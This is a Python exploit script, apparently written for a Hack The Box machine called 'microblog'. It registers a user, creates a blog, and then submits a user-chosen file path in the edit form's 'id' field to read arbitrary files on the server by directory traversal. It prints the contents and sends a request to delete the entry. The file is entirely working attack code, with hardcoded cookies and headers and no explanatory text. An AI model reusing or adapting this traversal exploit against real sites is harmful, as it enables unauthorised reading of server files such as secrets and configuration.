import requests

name =  "jeff"
print(name)

register_url = "http:///register/index.php"
dashboard_url = "http:///dashboard/index.php"
edit_url = "http:///edit/index.php"
proxy = "http://127.0.0.1:8080/"

file_path = input("Enter a file path: ")

user_info = {
    "first-name": f"{name}",
    "last-name": f"{name}",
    "username": f"{name}",
    "password": f"{name}"
}

blog_info = {
    "new-blog-name": f"{name}"
}

arbitrary_file_read_payload = {
    "id": f"{file_path}",
    "txt": f"{name}"
}


#creates user account
headers1 = {
    'Host': '',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '59',
    'Origin': '',
    'Connection': 'close',
    'Referer': 'h/register/?message=User%20already%20exists&status=fail',
    'Cookie': 'username=g051kefjc042uhm79jjsous0b6',
    'Upgrade-Insecure-Requests': '1'
}

#creates new blog
headers2 = {
    'Host': '',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '26',
    'Origin': 'http://',
    'Connection': 'close',
    'Referer': 'http:///dashboard/?message=Site%20added%20successfully!&status=success',
    'Cookie': 'username=g051kefjc042uhm79jjsous0b6',
    'Upgrade-Insecure-Requests': '1'
}

#request that actually has arbituray file read.
headers3 = {
    'Host': f'{name}.link',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '40',
    'Origin': 'http://',
    'Connection': 'close',
    'Referer': f'http://{name}.link/edit/',
    'Cookie': 'username=g051kefjc042uhm79jjsous0b6',
    'Upgrade-Insecure-Requests': '1'
}

default_page = {

    'Host': '',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://app.microblog.htb/login/',
    'Connection': 'close',
    'Cookie': 'username=g051kefjc042uhm79jjsous0b6',
    'Upgrade-Insecure-Requests': '1'

}

delete_page = {
    'Host': f'{name}.microblog.htb',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Length': '64',
    'Origin': f'http://{name}.link',
    'Connection': 'close',
    'Referer': f'http://{name}.link/edit/',
    'Cookie': 'username=g051kefjc042uhm79jjsous0b6'
}

delete_data = {
    'action': 'delete',
    'id': f'{file_path}'
}
# Session object for making requests with the same cookies
session = requests.Session()

# Register the new user
session.post(register_url, data=user_info, headers=headers1, proxies={'http': proxy}, allow_redirects=False)
response = session.post(register_url, data=user_info, headers=headers1)
#print(response.text)


session.get(dashboard_url, headers=default_page,allow_redirects=True)
response = session.get(dashboard_url, headers=default_page,allow_redirects=True)
#print(response.text)


# Create the new blog
session.post(dashboard_url, data=blog_info, headers=headers2, proxies={'http': proxy}, allow_redirects=False)
response = session.post(dashboard_url, data=blog_info, headers=headers2, proxies={'http': proxy})
#print(response.text)


# Read an arbitrary file using directory traversal
session.post(edit_url, data=arbitrary_file_read_payload, headers=headers3, proxies={'http': proxy}, allow_redirects=False) 
response = session.post(edit_url, data=arbitrary_file_read_payload, headers=headers3)
#print(response.text)

if response.status_code == 200:
    #print(response.text)
    split_response = response.text.split()
    print('\n'.join(split_response))

    session.post(edit_url, data=delete_data, headers=delete_page, proxies={'http': proxy}, allow_redirects=False) 
    #print(response.text)
else:
    print(f"Error: {response.status_code}")

